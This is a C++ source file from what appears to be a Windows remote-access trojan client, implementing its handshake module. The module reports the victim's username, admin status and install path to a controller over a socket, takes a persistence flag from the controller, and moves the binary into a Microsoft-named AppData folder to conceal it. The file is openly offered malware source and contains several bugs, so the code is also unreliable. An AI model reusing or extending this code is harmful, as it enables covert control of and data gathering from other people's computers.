#include <iostream>
#include <windows.h>

#include <Lmcons.h> // GetUserName UNLEN
#include <direct.h> // _getcwd
//#include <stdlib.h>

#include "../inc/HandShake.h"
#include "../inc/ModShell.h"
#include "../inc/Persistence.h"
#include "../inc/common.h"


using namespace  std;

HandShake::HandShake()
{
    cout << "Constructor called handsake:\n" << endl;
    a_name_user = setNameUser();
    a_is_admin = setIsAdmin();
    a_current_directory = setCurrentDirectory();
    a_name_prog = NAME_PROG;
    a_location_prog = setLocationProg();

    a_timeout.tv_sec = TIMEOUT_SOCK;
    a_timeout.tv_usec = 0;
    cout << " Constructor is ok" << endl;
}
void HandShake::setSock(int sock)
{
    a_sock = sock;
}

string HandShake::recvUltraSafe()
{
    //https://forum.hardware.fr/hfr/Programmation/C-2/resolu-timeout-existe-sujet_34270_1.htm

    char buffer[BUFFER_LEN];

    cout << strlen(buffer) << endl;
    cout <<  sizeof(buffer) << endl;
    
    if(strlen(buffer) > 0)
    {
        //clean buffer
        cout << "Clean " << endl;
        memset(buffer, 0, sizeof(buffer));
    }
    
    struct fd_set fds;

    FD_ZERO(&fds);
    FD_SET(a_sock, &fds);
    
    int selectSock = select(0, &fds, 0, 0, &a_timeout);
    
    if(selectSock > 0)
    {
        //while (true)
        int len_recv= recv(a_sock, buffer, sizeof(buffer), 0);
        if(len_recv == SOCKET_ERROR)
        {
            cout << "Error socket error  ///" << endl;
            return (string) "ERROR";
        }
        else if (len_recv == 0)
        {
            //pass
            cout << "pass" << endl;
        }
        else if (buffer == "exit")
        {
            //exit
           // break;
           ;
        }
    }
    else if (selectSock == 0)
    {
        //Timeout
        cout << "TIMEOUT recv !!" << endl;
        //Stop
        return (string) "TIMEOUT";
    }
    
    if(strlen(buffer) == 0)
    {
        //empty buffer
        return ""; 
    }
    else
    {
        //cout << buffer << endl;
        return (string) buffer;    
    }
}
int HandShake::startHandShake()
{
    // ' | ' for split data in python server.py script
    string is_admin;
    
    cout << "SOCKET STARTHAND " << a_sock << endl;
    if(a_is_admin)
    {
        //If admin
        cout << "tmp admin " << endl;
        is_admin = "MOD_HANDSHAKE_IS_ADMIN | True";
    }
    else
    {
        //if not admin
        is_admin = "MOD_HANDSHAKE_IS_ADMIN | False";
    }
    cout << a_location_prog << endl;
    cout << a_name_user << endl;
    string path_prog = "MOD_HANDSHAKE_PATH_PROG | "+ a_location_prog;
    string name_user = "MOD_HANDSHAKE_NAME_USER  | "+ a_name_user;
    cout << strlen(path_prog.c_str()) << strlen(path_prog.c_str()) << strlen(name_user.c_str()) << endl;
    
    if(send(a_sock, is_admin.c_str(),strlen(is_admin.c_str()),0) == SOCKET_ERROR)
    {
        perror("errror first 1");
    }
    cout << "send " << is_admin << endl;
    send(a_sock, path_prog.c_str(),strlen(path_prog.c_str()),0);
    cout << "send " << path_prog << endl;
    send(a_sock, name_user.c_str(),strlen(name_user.c_str()),0);
    cout << "send " << name_user << endl;

    send(a_sock, "\r\n",2,0);

    //-----------------------
    //SENDALL:
    // Ne pas oublier !!
    //cout << "send " << is_admin << endl;
    /*
    send(sock, is_admin.c_str(),strlen(is_admin.c_str()),0);
    Sleep(200);
    send(sock, path_prog.c_str(),strlen(path_prog.c_str()),0);
    Sleep(200);
    send(sock, name_user.c_str(),strlen(name_user.c_str()),0);
    Sleep(200);
    send(sock, "\r\n",2,0);
    */
//010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101
//010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101

    cout << "[+] second part of handshake  goooo !!" << endl;
    //Gets all the parameters that the server sends during the handshake.
    string result;
    char buffer[BUFFER_LEN];
    bool auto_persi = false; //default

    while(true)
    {
        /*
        len_recv =recv(a_sock,buffer,sizeof(buffer),0);
        if(len_recv == SOCKET_ERROR)
        {
            cout << "Error in startHandShake" << endl;
            break;
        }
        result.append(buffer,len_recv);    
        cout << "Len recv: " << len_recv << endl;
        cout << "result: " << result << endl;
        cout << "Len result: " << result.length() << endl;
        */

        string result = recvUltraSafe();
        if(result == "\r\n")
        {
            cout << "end handshake" << endl;
            break;
        }
        else if(result.substr(0,30) == "MOD_HANDSHAKE_AUTO_PERSISTENCE")
        {
            //All informations in MOD_HANDSHAKE_AUTO_PERSISTENCE
            cout << "MOD_HANDSHAKE_AUTO_PERSISTENCE ok" << endl;
            if(result.substr(33,result.length())== "True")
            {
               cout << "IS: " << result.substr(33,result.length()) << endl;
               //auto_persistence = true;
              // Persistence(true,path_prog).defaultPersi();
            }
            
            else if (result.substr(33,result.length())== "False")
            {
                cout << "IS: " << result.substr(33,result.length()) << endl;
                //auto_persistence = false;
            }
            
            else
            {
                cout << "Error  in recv MOD_HANDSHAKE_AUTO_PERSISTENCE" << endl;
            }
        }
        else
        {
            //Eroor
            ;
        }
        result.erase();        
    }
    
    return 0;
}

bool HandShake::setIsAdmin()
{
    cout << "SET ADMIN "<<endl;
    string result;
    cout << "call getamdin" << endl;
    ModShell().exec("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"",result);
    if(result.substr(0,4) == "True") //remove ruturn line.
    {
        cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return true;
    }
    else
    {
        cout << "NOT ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return false;
    }
}

string HandShake::setNameUser()
{
    cout << "call genameuser" << endl;
    TCHAR user[UNLEN+1];
    DWORD len_user = UNLEN+1;
    if(GetUserName(user,&len_user) == 0)
    {
        //if error
        return "Unknown";
    }
    else
    {
        string result(&user[0], &user[len_user]); //https://stackoverflow.com/questions/6291458/how-to-convert-a-tchar-array-to-stdstring
        cout <<"name user: " <<result << endl;
        return result.substr(0,result.length()-1);    
    }
    
}

string HandShake::setCurrentDirectory()
{
    cout << "call getcyrrentdirectory" << endl;
    char buffer[PATHLEN];
    _getcwd(buffer,PATHLEN);
    if(buffer == NULL)
    {
        return "Unknown";
    }
    else
    {
        return (string) buffer;
    }
}

string HandShake::setLocationProg()
{
    //if admin
    if(a_is_admin)
    {
        return (string)  PATH_ADMIN "\\" + a_name_prog;
    }
    else
    {
        string path_CONST=PATH_NOT_ADMIN;
        int index = 0;
        if(path_CONST.find("$USER") != string::npos)
        {   
            //If $user in string, replace by a_name_user (username of machine) 
            index = path_CONST.find("$USER");
           //cout <<"Index: " <<index << endl;
           //cout << PATH_NOT_ADMIN << endl;
           // cout << path_CONST.find("$USER") << endl;
            cout << "$USER DETECT: "<<index<< endl;
            path_CONST.replace(index,a_name_user.length(),a_name_user);
                        //de index, 5 char,  remplace par a_name_user
            cout << path_CONST << endl;;  
            return path_CONST + "\\" +a_name_prog;
        }
        else
        {
            return (string) "C:\\Users\\"+ a_name_user+"\\AppData\\Roaming\\Microsoft\\Windows\\" + a_name_prog;
        }
    }
}

bool HandShake::getIsAdmin()
{
    return a_is_admin; //ghetter
}

string HandShake::getPathProg()
{
    //cout << "GetPathProg: " << a_location_prog << endl;
    return a_location_prog;
}

string HandShake::getNameUser()
{
    return a_name_user;
}

void HandShake::moveProg()
{
   // Deplace le programme en fonction des privilèges de l'utilisateur.
    cout << "Move prog !!" << endl;
    cout << "name prog : " << a_name_prog << endl;
    cout << "Location prog: " << a_location_prog << endl;
    if(a_is_admin)
    {   
        if((rename(a_name_prog.c_str(), (a_location_prog).c_str())!=0))
        {   
            perror("Error in move prog ");
        }
    }
    else
    {
        //C:\Users\cisco\AppData\Roaming\Microsoft
        //if not adminW
        if((rename(a_name_prog.c_str(),(a_location_prog).c_str()))!= 0)
        {
            perror("Error in move prog ");      
        }
    }
    cout << "prog moved. " << endl;
}

/*
int HandShake::removeProg()
{
    //Remove curent program 
    //Remove the program to run.
    cout << "Remove call" << endl;
    cout << (a_current_directory+"\\"+NAME_PROG) << endl;
    string result;
    ModShell().exec(("del "+a_name_prog),result); //???

    return 0;
}
*/